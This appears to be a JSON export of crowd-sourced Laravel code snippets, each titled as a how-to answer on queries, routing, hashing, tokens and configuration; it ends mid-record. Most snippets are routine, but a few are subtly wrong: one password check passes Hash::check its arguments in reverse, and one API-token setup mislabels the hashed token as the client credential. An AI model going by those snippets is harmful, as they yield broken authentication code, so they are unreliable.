    "description": "//get Authorization Bearer Token value $token = $request->bearerToken();\n# Database Preparation // add api_token to users table Schema::table('users', function ($table) {     $table->string('api_token', 80)->after('password')                         ->unique()                         ->nullable()                         ->default(null); });  // Create token for existing users, code can also be added to registerController     $token = Str::random(60);     $user = User::find(1);     $user->api_token = hash('sha256', $token); // <- This will be used in client access     $user->save();    //config/auth.php     'guards' => [         'web' => [             'driver' => 'session',             'provider' => 'users',         ],          'api' => [             'driver' => 'token', // <- Add this entry             'provider' => 'users',             'hash' => false,         ],     ],                        //routes/api.php     // Add \"middleware('auth:api')\" as below         \tRoute::middleware('auth:api')->get('/user', function (Request $request) {         return $request->user();     });              //client access example (in Vue js)  axios.get('http://example.com/api/user',            {   headers: {      'Accept': 'application/json',      'Authorization': 'Bearer '+ 'user-api-token'   } }          )   .then(function (response) {   // handle success   console.log(response); })   .catch(function (error) {   // handle error   console.log(error); })  \n",
    "reg_date": "2021-10-12T10:16:04.000Z"
  },
  {
    "id": 2334,
    "keyword": null,
    "link": null,
    "title": " laravel get certain columns",
    "description": "Table::select('name','surname')->where('id', 1)->get();\n   $result = DB::Table('table_name')->select('column1','column2')->where('id',1)->get();  \nModelName::all('column1', 'column2', 'column3');\n",
    "reg_date": "2021-10-12T10:16:04.000Z"
  },
  {
    "id": 2335,
    "keyword": null,
    "link": null,
    "title": " laravel get class name",
    "description": "$myObject = $em->find(ContactRelation::class, $userId); echo get_class($myObject); // Some\\Name\\Space\\Domain\\Identity\\ContactRelation\n",
    "reg_date": "2021-10-12T10:16:04.000Z"
  },
  {
    "id": 2336,
    "keyword": null,
    "link": null,
    "title": " laravel get client public ip",
    "description": "$_SERVER['REMOTE_ADDR']\n",
    "reg_date": "2021-10-12T10:16:04.000Z"
  },
  {
    "id": 2337,
    "keyword": null,
    "link": null,
    "title": " laravel get column field name",
    "description": "use Illuminate\\Support\\Facades\\Schema;  use Illuminate\\Support\\Facades\\DB;  public function getTableColumns($table) {     return DB::getSchemaBuilder()->getColumnListing($table);      // OR      return Schema::getColumnListing($table);  }\n// You may need to run composer require doctrine/dbal // Retrieve laravel column type $columnType = DB::getSchemaBuilder()->getColumnType($tableName, $colName) // for example $columnType = DB::getSchemaBuilder()->getColumnType('user', 'age')\n",
    "reg_date": "2021-10-12T10:16:04.000Z"
  },
  {
    "id": 2338,
    "keyword": null,
    "link": null,
    "title": " laravel get controller name",
    "description": "If your layout is a Blade template, you could create a view composer that injects those variables into your layout. In app/Providers/AppServiceProvider.php add something like this:  public function boot() {     app('view')->composer('layouts.master', function ($view) {         $action = app('request')->route()->getAction();          $controller = class_basename($action['controller']);          list($controller, $action) = explode('@', $controller);          $view->with(compact('controller', 'action'));     }); } You will then have two variables available in your layout template: $controller and $action\n",
    "reg_date": "2021-10-12T10:16:04.000Z"
  },
  {
    "id": 2339,
    "keyword": null,
    "link": null,
    "title": " laravel get current action name",
    "description": "echo Route::getCurrentRoute()->getActionName();\n",
    "reg_date": "2021-10-12T10:16:05.000Z"
  },
  {
    "id": 2340,
    "keyword": null,
    "link": null,
    "title": " laravel get current domain",
    "description": "request()->getHost();\n",
    "reg_date": "2021-10-12T10:16:05.000Z"
  },
  {
    "id": 2341,
    "keyword": null,
    "link": null,
    "title": " laravel get current route name",
    "description": "Route::currentRouteName()\nGet the current url  here using the Request::url() method. It will return the entire URL, but strip the query string from it.  <p> Url: {{  Request::url() }} </p> Output  Url: http://localhost:8000/post/demo\nrequest()->route()->getName()\n<p> Path: {{ Request::path() }} </p>\nRoute::getCurrentRoute()->getActionName();\n// Check if route is *** Request::route()->named(\"YourRouteNameView\")\n",
    "reg_date": "2021-10-12T10:16:05.000Z"
  },
  {
    "id": 2342,
    "keyword": null,
    "link": null,
    "title": " laravel get env variable",
    "description": "env('APP_URL')\ndd(env('APP_NAME'));\nFive most important commands if your Laravel is not working as expected after  some modifications in .env or database folder or because of any other modifications.  Here is full explanation: https://www.youtube.com/watch?v=Q1ynDMC8UGg  php artisan config:clear php artisan cache:clear composer dump-autoload php artisan view:clear php artisan route:clear  After clearup, try \"echo env('URL_BUILDER')\"\nif (App::environment('local')) {     // The environment is local }  if (App::environment(['local', 'staging'])) {     // The environment is either local OR staging... }\nlaravel get env variable\n",
    "reg_date": "2021-10-12T10:16:05.000Z"
  },
  {
    "id": 2343,
    "keyword": null,
    "link": null,
    "title": " laravel get errors from validator blade",
    "description": "<!-- /resources/views/post/create.blade.php -->  <h1>Create Post</h1>  @if ($errors->any())     <div class=\"alert alert-danger\">         <ul>             @foreach ($errors->all() as $error)                 <li>{{ $error }}</li>             @endforeach         </ul>     </div> @endif  <!-- Create Post Form -->\n",
    "reg_date": "2021-10-12T10:16:05.000Z"
  },
  {
    "id": 2344,
    "keyword": null,
    "link": null,
    "title": " laravel get extension from url",
    "description": "$extension = pathinfo(storage_path('/uploads/my_image.jpg'), PATHINFO_EXTENSION);dd($extension);\n",
    "reg_date": "2021-10-12T10:16:05.000Z"
  },
  {
    "id": 2345,
    "keyword": null,
    "link": null,
    "title": " laravel get file contents from storage",
    "description": "$contents = Storage::disk('local')->get('file.txt');\nuse Illuminate\\Support\\Facades\\Storage;  $path = Storage::path('file.jpg');\nStorage::get('\\public\\FileNameHere')\n",
    "reg_date": "2021-10-12T10:16:05.000Z"
  },
  {
    "id": 2346,
    "keyword": null,
    "link": null,
    "title": " laravel get file in public folder",
    "description": "// Path to the project's root folder     echo base_path();  // Path to the 'app' folder     echo app_path();          // Path to the 'public' folder     echo public_path();  // Path to the 'storage' folder     echo storage_path();  // Path to the 'storage/app' folder     echo storage_path('app'); \nStorage::get('\\public\\FileNameHere')\n",
    "reg_date": "2021-10-12T10:16:05.000Z"
  },
  {
    "id": 2347,
    "keyword": null,
    "link": null,
    "title": " laravel get file name",
    "description": "$path = $request->image->getClientOriginalName();\n",
    "reg_date": "2021-10-12T10:16:06.000Z"
  },
  {
    "id": 2348,
    "keyword": null,
    "link": null,
    "title": " laravel get fillable attributes",
    "description": "$model = new Demo(); dd($model->getFillable());\n",
    "reg_date": "2021-10-12T10:16:06.000Z"
  },
  {
    "id": 2349,
    "keyword": null,
    "link": null,
    "title": " laravel get first letter of each word",
    "description": "$words = explode(\" \", \"Community College District\"); $acronym = \"\";  foreach ($words as $w) {   $acronym .= $w[0]; } \n",
    "reg_date": "2021-10-12T10:16:06.000Z"
  },
  {
    "id": 2350,
    "keyword": null,
    "link": null,
    "title": " laravel get first record",
    "description": "'First email'     User::whereEmail($email)->first(); 'First Record'    User::first();\n$user = User::whereEmail($email)->first(); \n// return first row by id $user = App\\User::where('id',$id)->first(); // or return directly a field $userId = App\\User::where(...)->pluck('id');\n$user = DB::table('users')->where('name', 'John')->first();  var_dump($user->name);\n$first = $msgs->first(); // this does ->take(1) under the hood \n",
    "reg_date": "2021-10-12T10:16:06.000Z"
  },
  {
    "id": 2351,
    "keyword": null,
    "link": null,
    "title": " laravel get header from request",
    "description": "public function yourControllerFunction(\\Illuminate\\Http\\Request $request) {     $header = $request->header('Authorization');      // do some stuff }\n",
    "reg_date": "2021-10-12T10:16:06.000Z"
  },
  {
    "id": 2352,
    "keyword": null,
    "link": null,
    "title": " laravel get host with http",
    "description": "$host = $request->getSchemeAndHttpHost(); // returns https://dev.site.com\n",
    "reg_date": "2021-10-12T10:16:06.000Z"
  },
  {
    "id": 2353,
    "keyword": null,
    "link": null,
    "title": " laravel get image extension",
    "description": "$extension = pathinfo(storage_path('/uploads/my_image.jpg'), PATHINFO_EXTENSION); dd($extension);\n",
    "reg_date": "2021-10-12T10:16:06.000Z"
  },
  {
    "id": 2354,
    "keyword": null,
    "link": null,
    "title": " laravel get input from request",
    "description": "    public function store(Request $request)     {         $name = $request->input('name');          //     }\n$input = $request->all();\nif ($request->has('name')) {     // }\n",
    "reg_date": "2021-10-12T10:16:06.000Z"
  },
  {
    "id": 2355,
    "keyword": null,
    "link": null,
    "title": " laravel get last 5 records",
    "description": "Dogs::latest()->take(5)->get(); \nModel::latest()->first();\n$row = News::count();         $newsid = $row -2;         $news1 = News::all()->last();         $news2 = News::orderBy('created_at', 'desc')->skip($newsid)->take($newsid)->first();         return view('user/start', compact('news1', 'news2', 'newsid'));\n",
    "reg_date": "2021-10-12T10:16:06.000Z"
  },
  {
    "id": 2356,
    "keyword": null,
    "link": null,
    "title": " laravel get last get request",
    "description": "{{ url()->previous() }}\n",
    "reg_date": "2021-10-12T10:16:06.000Z"
  },
  {
    "id": 2357,
    "keyword": null,
    "link": null,
    "title": " laravel get last id",
    "description": "// how to get last inserted id in laravel  //METHOD-1 $data->save(); $lastId = $data->id;  //METHOD-2 $data = Booking::latest('id')->first(); $id = data->id;\n$last3 = DB::table('items')->latest('id')->first();\n$id = DB::table('users')    ->insertGetId(  \t  ['name' => 'Akash Savani', 'email'=>'akash@gmail.com']  );\nDB::table('myTable')->orderBy('id','desc')->first();\n$last2 = DB::table('items')->orderBy('id', 'DESC')->first();\n$last = DB::table('items')->latest()->first();\n",
    "reg_date": "2021-10-12T10:16:06.000Z"
  },
  {
    "id": 2358,
    "keyword": null,
    "link": null,
    "title": " laravel get last record",
    "description": "Dogs::latest()->take(5)->get(); \nModel::latest()->first();\nreturn DB::table('files')->order_by('upload_time', 'desc')->first();\n$row = News::count();         $newsid = $row -2;         $news1 = News::all()->last();         $news2 = News::orderBy('created_at', 'desc')->skip($newsid)->take($newsid)->first();         return view('user/start', compact('news1', 'news2', 'newsid'));\n",
    "reg_date": "2021-10-12T10:16:07.000Z"
  },
  {
    "id": 2359,
    "keyword": null,
    "link": null,
    "title": " laravel get list of columns in a table",
    "description": "use Illuminate\\Support\\Facades\\Schema;  use Illuminate\\Support\\Facades\\DB;  public function getTableColumns($table) {     return DB::getSchemaBuilder()->getColumnListing($table);      // OR      return Schema::getColumnListing($table);  }\n",
    "reg_date": "2021-10-12T10:16:07.000Z"
  },
  {
    "id": 2360,
    "keyword": null,
    "link": null,
    "title": " laravel get next record",
    "description": "public function show($id) {      // get the current user     $user = User::find($id);      // get previous user id     $previous = User::where('id', '<', $user->id)->max('id');      // get next user id     $next = User::where('id', '>', $user->id)->min('id');      return View::make('users.show')->with('previous', $previous)->with('next', $next); }\n",
    "reg_date": "2021-10-12T10:16:07.000Z"
  },
  {
    "id": 2361,
    "keyword": null,
    "link": null,
    "title": " laravel get only relationship",
    "description": "$products = $popularProducts->pluck('product');\n",
    "reg_date": "2021-10-12T10:16:07.000Z"
  },
  {
    "id": 2362,
    "keyword": null,
    "link": null,
    "title": " laravel get parameters from request",
    "description": "request()->all() // All parameters request()->get('param') // One parameter request()->only('param1', 'param2') // Specific parameters\n $data = $request->only(             'project_name',             'project_code',             'block_count',             'unit_count',             'contractor_name',    );\n$request->input('name'); $request->input('user.name'); // fetch from user object\n",
    "reg_date": "2021-10-12T10:16:07.000Z"
  },
  {
    "id": 2363,
    "keyword": null,
    "link": null,
    "title": " laravel get path to storage folder",
    "description": "$path = storage_path('app/file.txt'); \nuse Illuminate\\Support\\Facades\\Storage;  $path = Storage::path('file.jpg');\n",
    "reg_date": "2021-10-12T10:16:07.000Z"
  },
  {
    "id": 2364,
    "keyword": null,
    "link": null,
    "title": " laravel get project root",
    "description": "public_path(); // Path of public/ base_path(); // Path of application root storage_path(); // Path of storage/ app_path(); // Path of app/\n",
    "reg_date": "2021-10-12T10:16:07.000Z"
  },
  {
    "id": 2365,
    "keyword": null,
    "link": null,
    "title": " laravel get public path url",
    "description": "// Path to the project's root folder     echo base_path();  // Path to the 'app' folder     echo app_path();          // Path to the 'public' folder     echo public_path();  // Path to the 'storage' folder     echo storage_path();  // Path to the 'storage/app' folder     echo storage_path('app'); \n",
    "reg_date": "2021-10-12T10:16:07.000Z"
  },
  {
    "id": 2366,
    "keyword": null,
    "link": null,
    "title": " laravel get query parameters",
    "description": "$name = $request->query('name', 'Helen');\n$query->toSql();  $query->getBindings() \n$request->input('name'); $request->input('user.name'); // fetch from user object\n$result = array_map(function ($value) {     return (array)$value; }, $result);\n$request->fullUrl() \n",
    "reg_date": "2021-10-12T10:16:07.000Z"
  },
  {
    "id": 2367,
    "keyword": null,
    "link": null,
    "title": " laravel get random number of data from database",
    "description": "Model::select('column')     ->where('column','value')     ->inRandomOrder()     ->limit(2) // here is yours limit     ->get(); \nModelName::where('column',$condition)->random($number)->get();\n",
    "reg_date": "2021-10-12T10:16:07.000Z"
  },
  {
    "id": 2368,
    "keyword": null,
    "link": null,
    "title": " laravel get random row",
    "description": "User::all()->random(); User::all()->random(10); // The amount of items you wish to receive\n",
    "reg_date": "2021-10-12T10:16:08.000Z"
  },
  {
    "id": 2369,
    "keyword": null,
    "link": null,
    "title": " laravel get request in blade",
    "description": "  {{ request()->get('balls') }}  or  {{ \\Request::get('balls') }}   \ndd($request->all()); //print an array of the input name and the input value\n",
    "reg_date": "2021-10-12T10:16:08.000Z"
  },
  {
    "id": 2370,
    "keyword": null,
    "link": null,
    "title": " laravel get result in pagnation",
    "description": "In Controller  $subSections = Subsection::with('mainsection')->paginate(2);  In Blade  {{ $subSections->links() }}  Or  {{ $subSections->appends(request()->except('page'))->links() }}  For designing the pagination  https://laravel.com/docs/8.x/pagination  Follow me at www.makeyourownproject.com\n",
    "reg_date": "2021-10-12T10:16:08.000Z"
  },
  {
    "id": 2371,
    "keyword": null,
    "link": null,
    "title": " laravel get route in unauthenticated",
    "description": "$request->is('api/*')\n",
    "reg_date": "2021-10-12T10:16:08.000Z"
  },
  {
    "id": 2372,
    "keyword": null,
    "link": null,
    "title": " laravel get session variable in controller",
    "description": "$value = Session::get('variableSetOnPageA'); \n$request->session()->put('key','value'); \n",
    "reg_date": "2021-10-12T10:16:08.000Z"
  },
  {
    "id": 2373,
    "keyword": null,
    "link": null,
    "title": " laravel get single column value",
    "description": "Vehicle::find(3)->value('register_number');\n$items = DB::table('items')              ->select('id', 'ref_code', 'name', 'price')              ->where('ref_code','=', $request->ref_code)              ->first(); \nModelName::find(id)->value('column_name');\n",
    "reg_date": "2021-10-12T10:16:08.000Z"
  },
  {
    "id": 2374,
    "keyword": null,
    "link": null,
    "title": " laravel get stubs",
    "description": "php artisan stub:publish\n",
    "reg_date": "2021-10-12T10:16:08.000Z"
  },
  {
    "id": 2375,
    "keyword": null,
    "link": null,
    "title": " laravel get subdomain",
    "description": "Route::group(array('domain' => '{subdomain}.project.dev'), function() {      Route::get('foo', function($subdomain) {         // Here I can access $subdomain     });      $subdomain = Route::input('subdomain');  }); \n",
    "reg_date": "2021-10-12T10:16:08.000Z"
  },
  {
    "id": 2376,
    "keyword": null,
    "link": null,
    "title": " laravel get url segment",
    "description": "{{ Request::segment(1) }} \n$uri_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH); $uri_segments = explode('/', $uri_path);  echo $uri_segments[0]; // for www.example.com/user/account you will get 'user'\n",
    "reg_date": "2021-10-12T10:16:08.000Z"
  },
  {
    "id": 2377,
    "keyword": null,
    "link": null,
    "title": " laravel gmail",
    "description": "MAIL_DRIVER=smtp MAIL_HOST=smtp.googlemail.com MAIL_PORT=465 MAIL_USERNAME=ENTER_YOUR_EMAIL_ADDRESS(GMAIL) MAIL_PASSWORD=ENTER_YOUR_GMAIL_PASSWORD MAIL_ENCRYPTION=ssl\nMAIL_DRIVER=smtpMAIL_HOST=smtp.googlemail.comMAIL_PORT=465MAIL_USERNAME=ENTER_YOUR_EMAIL_ADDRESS(GMAIL)MAIL_PASSWORD=ENTER_YOUR_GMAIL_PASSWORDMAIL_ENCRYPTION=ssl\n",
    "reg_date": "2021-10-12T10:16:09.000Z"
  },
  {
    "id": 2378,
    "keyword": null,
    "link": null,
    "title": " laravel group by created at date only",
    "description": "//Laravel ⛳  DB::table('table_name')   ->select('*',DB::raw('DATE(created_at) as date'))   ->get()->groupBy('date');\n",
    "reg_date": "2021-10-12T10:16:09.000Z"
  },
  {
    "id": 2379,
    "keyword": null,
    "link": null,
    "title": " laravel group by with where clause",
    "description": "$user_info = DB::table('usermetas')                  ->select('browser', DB::raw('count(*) as total'))                  ->groupBy('browser')                  ->get();\n$groupedSalesCampaign = Order::with('Campaign')             ->where('isapproved','=','Y')             ->groupBy('campaign_id')             ->orderBy(DB::raw('COUNT(id)','desc'))             ->get(array(DB::raw('COUNT(id) as totalsales'),'campaign_id'));\n",
    "reg_date": "2021-10-12T10:16:09.000Z"
  },
  {
    "id": 2380,
    "keyword": null,
    "link": null,
    "title": " laravel group routes",
    "description": "Route::group(['prefix'=>'accounts','as'=>'account.'], function(){     Route::get('/', 'AccountController@index')->name('index');     Route::get('connect', 'AccountController@connect')->name('connect'); });  Route::group(['prefix'=>'quotes','as'=>'quote.'], function(){     Route::get('/', 'QuoteController@index')->name('index');     Route::get('connect', 'QuoteController@create')->name('create'); });\nRoute::middleware(['first', 'second'])->group(function () {     Route::get('/', function () {         // Uses first & second middleware...     });      Route::get('/user/profile', function () {         // Uses first & second middleware...     }); });\nRoute::group(['prefix' => 'admin'], function () {     Route::get('users', function ()    {         // Matches The \"/admin/users\" URL     }); });\nRoute::pattern('id', '[0-9]+'); Route::get('user/{id}', function ($id) {     // Only executed if {id} is numeric... });\nRoute::get('user/{id}', function ($id) {     return 'User '.$id; });\nRoute::match(['get', 'post'], '/', function () {     // });  Route::any('/', function () {     // });\n",
    "reg_date": "2021-10-12T10:16:09.000Z"
  },
  {
    "id": 2381,
    "keyword": null,
    "link": null,
    "title": " laravel groupby and latest",
    "description": "$user_info = DB::table('usermetas')                  ->select('browser', DB::raw('count(*) as total'))                  ->groupBy('browser')                  ->get();\n//If You want the latest id of records then you can use unique() after get(), //don't use group by if you use groupBy  //then you lose your control from id. I hope this is useful for you  myModel::select('id','purch','name','prcvalue')   ->where('purch','=','10234')   ->orderBy('prcvalue','DESC')   ->get()   ->unique('name'); \n",
    "reg_date": "2021-10-12T10:16:09.000Z"
  },
  {
    "id": 2382,
    "keyword": null,
    "link": null,
    "title": " laravel grouping routes",
    "description": "Route::middleware(['first', 'second'])->group(function () {     Route::get('/', function () {         // Uses first & second middleware...     });      Route::get('/user/profile', function () {         // Uses first & second middleware...     }); });\nRoute::group(['prefix' => 'admin'], function () {     Route::get('users', function ()    {         // Matches The \"/admin/users\" URL     }); });\nRoute::prefix('admin')->group(function () {     Route::get('/users', function () {         // Matches The \"/admin/users\" URL     }); });\n",
    "reg_date": "2021-10-12T10:16:09.000Z"
  },
  {
    "id": 2383,
    "keyword": null,
    "link": null,
    "title": " laravel guest blade",
    "description": "//LARAVEL - BLADE:  @guest     // The user is not authenticated... @endguest    @auth     // The user is authenticated... @endauth\n<!-- /resources/views/alert.blade.php -->  <div class=\"alert alert-danger\">     {{ $slot }} </div>\n",
    "reg_date": "2021-10-12T10:16:09.000Z"
  },
  {
    "id": 2384,
    "keyword": null,
    "link": null,
    "title": " laravel handle queryexception",
    "description": "try {   $this->model->create($data);  } catch (Illuminate\\Database\\QueryException $e) {   dd($e);  } catch (PDOException $e) {   dd($e); }   \n",
    "reg_date": "2021-10-12T10:16:09.000Z"
  },
  {
    "id": 2385,
    "keyword": null,
    "link": null,
    "title": " laravel hasOne",
    "description": "use Illuminate\\Database\\Eloquent\\Builder;  // Retrieve posts with at least one comment containing words like foo%... $posts = App\\Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'foo%'); })->get();  // Retrieve posts with at least ten comments containing words like foo%... $posts = App\\Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'foo%'); }, '>=', 10)->get();\nEvent::with([\"owner\", \"participants\" => function($q) use($someId){     $q->where('participants.IdUser', '=', 1);     //$q->where('some other field', $someId); }])\n<?php  namespace App;  use Illuminate\\Database\\Eloquent\\Model;  class User extends Model {     /**      * Get the phone record associated with the user.      */     public function phone()     {         return $this->hasOne('App\\Phone');     } }\nuse Illuminate\\Database\\Eloquent\\Builder;  // Retrieve posts with at least one comment containing words like code%... $posts = Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'code%'); })->get();  // Retrieve posts with at least ten comments containing words like code%... $posts = Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'code%'); }, '>=', 10)->get();\n<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model;  class Phone extends Model {     /**      * Get the user that owns the phone.      */     public function user()     {         return $this->belongsTo('App\\Models\\User');     } }\n<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model;  class Post extends Model {     /**      * Get the comments for the blog post.      */     public function comments()     {         return $this->hasMany('App\\Models\\Comment');     } }\n",
    "reg_date": "2021-10-12T10:16:09.000Z"
  },
  {
    "id": 2386,
    "keyword": null,
    "link": null,
    "title": " laravel has one through",
    "description": "<?php  namespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Mechanic extends Model {     /**      * Get the car's owner.      */     public function carOwner()     {         return $this->hasOneThrough('App\\Owner', 'App\\Car');     } }\nclass Country extends Model {     public function posts()     {         return $this->hasManyThrough(             'App\\Post',             'App\\User',             'country_id', // Foreign key on users table...             'user_id', // Foreign key on posts table...             'id', // Local key on countries table...             'id' // Local key on users table...         );     } }  when countries     id - integer     name - string  users     id - integer     country_id - integer     name - string  posts     id - integer     user_id - integer     title - string\n<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model;  class Post extends Model {     /**      * Get the comments for the blog post.      */     public function comments()     {         return $this->hasMany('App\\Models\\Comment');     } }\n",
    "reg_date": "2021-10-12T10:16:10.000Z"
  },
  {
    "id": 2387,
    "keyword": null,
    "link": null,
    "title": " laravel has table",
    "description": "Schema::hasTable('mytable');\nif (Schema::hasTable('users')) {     // The \"users\" table exists... }  if (Schema::hasColumn('users', 'email')) {     // The \"users\" table exists and has an \"email\" column... }\n",
    "reg_date": "2021-10-12T10:16:10.000Z"
  },
  {
    "id": 2388,
    "keyword": null,
    "link": null,
    "title": " laravel hash",
    "description": "use Illuminate\\Support\\Facades\\Hash;  Hash::make($newPassword);  if (Hash::check('plain-text', $hashedPassword)) {     // The passwords match... }\n$password = Hash::make('yourPa$$w0rd');\nuse Illuminate\\Support\\Facades\\Hash;\n",
    "reg_date": "2021-10-12T10:16:10.000Z"
  },
  {
    "id": 2389,
    "keyword": null,
    "link": null,
    "title": " laravel hash check password, Verifying That A Password Matches A Hash",
    "description": "if (Hash::check('plain-text', $hashedPassword)) {     // The passwords match... }\n<?php  namespace App\\Http\\Controllers;  use App\\Http\\Controllers\\Controller; use Illuminate\\Http\\Request; use Illuminate\\Support\\Facades\\Hash;  class PasswordController extends Controller {     /**      * Update the password for the user.      *      * @param  \\Illuminate\\Http\\Request  $request      * @return \\Illuminate\\Http\\Response      */     public function update(Request $request)     {         // Validate the new password length...          $request->user()->fill([             'password' => Hash::make($request->newPassword)         ])->save();     } }\n",
    "reg_date": "2021-10-12T10:16:10.000Z"
  },
  {
    "id": 2390,
    "keyword": null,
    "link": null,
    "title": " laravel hash namespace",
    "description": "$password = Hash::make('yourPa$$w0rd');\nuse Illuminate\\Support\\Facades\\Hash;\n",
    "reg_date": "2021-10-12T10:16:10.000Z"
  },
  {
    "id": 2391,
    "keyword": null,
    "link": null,
    "title": " laravel hash password check",
    "description": "if (Hash::check('plain-text', $hashedPassword)) {     // The passwords match... }\n$data = User::find($id); if( ! Hash::check( $data->password , Input::get('currPassword') ) ) {     return Redirect::to('/admin/profile')         ->with('message', 'Current Password Error !')         ->withInput(); } \n",
    "reg_date": "2021-10-12T10:16:10.000Z"
  },
  {
    "id": 2392,
    "keyword": null,
    "link": null,
    "title": " laravel hasmanythrough example",
    "description": "<?php    namespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Category extends Model {     public function orders()     {         return $this->hasManyThrough(             'App\\Order',             'App\\Product',             'category_id', // Foreign key on products table...             'product_id', // Foreign key on orders table...             'id', // Local key on categories table...             'id' // Local key on products table...         );     } }  // full answer is in source: https://xpertphp.com/laravel-hasmanythrough-eloquent-relationship-tutorial-example/\n<?php  namespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Mechanic extends Model {     /**      * Get the car's owner.      */     public function carOwner()     {         return $this->hasOneThrough('App\\Owner', 'App\\Car');     } }\nclass Country extends Model {     public function posts()     {         return $this->hasManyThrough(             'App\\Post',             'App\\User',             'country_id', // Foreign key on users table...             'user_id', // Foreign key on posts table...             'id', // Local key on countries table...             'id' // Local key on users table...         );     } }  when countries     id - integer     name - string  users     id - integer     country_id - integer     name - string  posts     id - integer     user_id - integer     title - string\n",
    "reg_date": "2021-10-12T10:16:10.000Z"
  },
  {
    "id": 2393,
    "keyword": null,
    "link": null,
    "title": " laravel hasone users relations",
    "description": "    public function user(): \\Illuminate\\Database\\Eloquent\\Relations\\HasOne     {         return $this->hasOne(User::class, 'id', 'user_id');     }\n",
    "reg_date": "2021-10-12T10:16:10.000Z"
  },
  {
    "id": 2394,
    "keyword": null,
    "link": null,
    "title": " laravel hide columns",
    "description": "<?php  class User extends Eloquent {       protected $hidden = array('password', 'token');  }\n",
    "reg_date": "2021-10-12T10:16:10.000Z"
  },
  {
    "id": 2395,
    "keyword": null,
    "link": null,
    "title": " laravel how to test email testing",
    "description": "\\Mail::raw('hello world', function($message) {    $message->subject('Testing email')->to('test@example.org'); });\n",
    "reg_date": "2021-10-12T10:16:11.000Z"
  },
  {
    "id": 2396,
    "keyword": null,
    "link": null,
    "title": " laravel htaccess",
    "description": "<IfModule mod_rewrite.c> Options +FollowSymLinks RewriteEngine On  RewriteCond %{REQUEST_URI} !^/public/   RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f    RewriteRule ^(.*)$ /public/$1  #RewriteRule ^ index.php [L] RewriteRule ^(/)?$ public/index.php [L]  </IfModule> \n<IfModule mod_rewrite.c> RewriteEngine On RewriteRule ^(.*)$ public/$1 [L] </IfModule>\nOptions +FollowSymLinks -Indexes  RewriteEngine On  RewriteCond %{HTTP:Authorization}  RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]  RewriteCond %{REQUEST_FILENAME} !-d  RewriteCond %{REQUEST_FILENAME} !-f  RewriteRule ^ index.php [L]\n",
    "reg_date": "2021-10-12T10:16:11.000Z"
  },
  {
    "id": 2397,
    "keyword": null,
    "link": null,
    "title": " laravel http request get response",
    "description": "use Illuminate\\Support\\Facades\\Http;  $response = Http::get('http://example.com');  // The get method returns an instance of Illuminate\\Http\\Client\\Response, // which provides a variety of methods that may be used to inspect the response: $response->body() : string; $response->json() : array|mixed; $response->collect() : Illuminate\\Support\\Collection; $response->status() : int; $response->ok() : bool; $response->successful() : bool; $response->failed() : bool; $response->serverError() : bool; $response->clientError() : bool; $response->header($header) : string; $response->headers() : array;\n",
    "reg_date": "2021-10-12T10:16:11.000Z"
  },
  {
    "id": 2398,
    "keyword": null,
    "link": null,
    "title": " laravel http retry",
    "description": "use Illuminate\\Support\\Facades\\Http; // The retry method accepts two arguments: // (1st) the maximum number of times the request should be attempted // (2nd) the number of milliseconds that Laravel should wait in between attempts: $response = Http::retry(3, 100)->post(...);\n",
    "reg_date": "2021-10-12T10:16:11.000Z"
  },
  {
    "id": 2399,
    "keyword": null,
    "link": null,
    "title": " laravel https assets",
    "description": "<?php  namespace App\\Providers;  use Illuminate\\Support\\ServiceProvider; use Illuminate\\Support\\Facades\\Schema;  class AppServiceProvider extends ServiceProvider {     /**      * Bootstrap any application services.      *      * @return void      */     public function boot()     {         if(env('REDIRECT_HTTPS'))         {             \\URL::forceScheme('https');         }          Schema::defaultStringLength(191);     }      /**      * Register any application services.      *      * @return void      */     public function register()     {         //     } } \n",
    "reg_date": "2021-10-12T10:16:11.000Z"
  },
  {
    "id": 2400,
    "keyword": null,
    "link": null,
    "title": " laravel ide-helper",
    "description": "composer require --dev barryvdh/laravel-ide-helper\nphp artisan ide-helper:generate\nBarryvdh\\LaravelIdeHelper\\IdeHelperServiceProvider::class,\n",
    "reg_date": "2021-10-12T10:16:11.000Z"
  },
  {
    "id": 2401,
    "keyword": null,
    "link": null,
    "title": " laravel ide helper",
    "description": "composer require --dev barryvdh/laravel-ide-helper\nphp artisan ide-helper:generate\nBarryvdh\\LaravelIdeHelper\\IdeHelperServiceProvider::class,\n",
    "reg_date": "2021-10-12T10:16:11.000Z"
  },
  {
    "id": 2402,
    "keyword": null,
    "link": null,
    "title": " laravel if database has table",
    "description": "Schema::hasTable('mytable');\nif (!Schema::hasTable('table_name')) {     // Code to create table }\nif (Schema::hasTable('users')) {     // The \"users\" table exists... }  if (Schema::hasColumn('users', 'email')) {     // The \"users\" table exists and has an \"email\" column... }\n",
    "reg_date": "2021-10-12T10:16:12.000Z"
  },
  {
    "id": 2403,
    "keyword": null,
    "link": null,
    "title": " laravel if file is image",
    "description": "$allowedMimeTypes = ['image/jpeg','image/gif','image/png']; $contentType = $request->file->getClientMimeType();  if(! in_array($contentType, $allowedMimeTypes) ){   return response()->json('error: Not an image'); }else{   return $this->productService->storeImage($request->file); }\n",
    "reg_date": "2021-10-12T10:16:12.000Z"
  },
  {
    "id": 2404,
    "keyword": null,
    "link": null,
    "title": " laravel if request has",
    "description": "if ($request->has('name')) {     // } \nif ($request->has('name')) {     // }\ndd($request->all()); //print an array of the input name and the input value\n",
    "reg_date": "2021-10-12T10:16:12.000Z"
  },
  {
    "id": 2405,
    "keyword": null,
    "link": null,
    "title": " laravel if syntax",
    "description": "@if (foo)   // do something @elseif (bar)   // do something else @else   // do some other thing; @endif\n",
    "reg_date": "2021-10-12T10:16:12.000Z"
  },
  {
    "id": 2406,
    "keyword": null,
    "link": null,
    "title": " laravel if view exists",
